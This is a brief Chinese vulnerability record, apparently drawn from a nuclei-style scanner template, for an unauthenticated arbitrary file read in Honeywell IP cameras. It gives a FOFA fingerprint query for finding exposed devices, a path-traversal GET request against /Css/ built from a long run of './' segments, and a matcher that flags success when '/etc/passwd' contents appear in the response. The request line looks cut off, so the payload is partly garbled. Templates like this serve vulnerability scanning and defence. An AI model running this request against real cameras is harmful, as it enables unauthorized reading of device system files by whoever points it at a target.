# 霍尼韦尔(中国)有限公司摄像头css存在文件读取

- **系统**：霍尼韦尔(中国)有限公司摄像头　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title=”Honeywell IP camera”`
- **请求**：`GET /Css//./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././`
- **关键头**：`id: honeywell-camera-css-fileread`　`name: honeywell-camera-css-fileread`　`author: unknown`　`severity: high`　`description: 霍尼韦尔(中国)有限公司摄像头 css 存在文件读取漏洞，可未授权读取所有文件。`　`tags: everything,fileread`　`fofa-query: title=Honeywell IP camera`

**请求体 / payload**
```
- raw:
-
Host: <target-host>
matchers:
- type: dsl
name: fileread
dsl:
- "status_code == 200 && contains(body, 'root:/bin')"
```
- **预期**：200　|　—